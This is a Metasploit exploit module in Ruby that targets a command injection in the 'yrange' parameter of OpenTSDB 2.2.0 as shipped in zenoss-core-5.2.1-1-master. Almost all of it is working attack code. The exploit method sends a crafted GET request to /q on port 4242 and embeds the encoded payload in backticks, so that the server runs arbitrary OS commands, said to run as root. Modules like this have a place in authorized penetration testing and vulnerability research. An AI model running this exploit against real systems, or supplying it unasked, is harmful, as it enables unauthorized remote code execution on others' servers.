require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'zenoss-core-5.2.1-1-master Command Injection',
      'Description'    => %q{
	This module exploits a command injection vulnerabilty in zenoss-core-5.2.1-1-master.
	The vulnerability is in zenoss-core-5.2.1-1-master implementation of OpenTSDB (2.2.0). 
	A command injection vulnerability in 'yrange' parameter allows for os commands to be
	executed as root. Under zenoss-core-5.2.1-1-master, the OpenTSDB application is 
	implemented as a docker image. 
      },
      'Author'         => [ 'Mario Ceballos' ],
      'License'        => [ 'BSD_LICENSE' ],
      'References'     => [ 'URL', 'https://www.zenoss.org/' ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 1024,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'python',
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'zenoss-core-5.2.1-1-master', { }]],
      'DisclosureDate' => 'Feb 14 2017', 
      'DefaultTarget' => 0))

    register_options(
      [
	OptBool.new('SSL', [false, 'Use SSL', false]),
	Opt::RPORT(4242)
      ], self.class)
  end

  def exploit

    print_status("Sending request to service...")	
    res = send_request_cgi( {
      'method' => 'GET',
      'uri'    => '/q',
      'encode_params' => false,
      'vars_get' => {
	'start' => "2017/02/15-10:00:00",
	'end'   => "2017/02/15-19:06:35",
	'm'     => "sum:docker.usageinkernelmode",
	'o'     => "",
	'yrange'        => "[0%3a]" + Rex::Text.uri_encode("|`" + payload.encoded + "` # |"),
	'xhy'   => "1319x576",
	'style' => "linespoint&json",
      }
    }, 5)
    
   handler
  end

end
